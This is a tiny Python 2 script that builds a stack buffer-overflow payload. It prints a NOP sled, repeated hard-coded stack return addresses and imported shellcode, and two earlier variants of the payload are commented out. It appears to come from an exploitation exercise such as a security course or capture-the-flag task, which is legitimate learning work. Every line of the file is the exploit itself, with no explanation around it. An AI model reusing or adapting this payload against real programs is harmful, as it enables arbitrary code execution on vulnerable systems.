from shellcode import shellcode 

# print '\x90' * 1012 + shellcode + '\x90' + '\x38\x82\xf3\xbe'

# print '\x90' * 1032 + '\xc8\x7d\xfe\xbf' *64 + '\x90'*256 + shellcode
print '\x90' * 1032 + '\xb0\x7e\xfe\xbf' *2 + '\x90' * 280 + shellcode

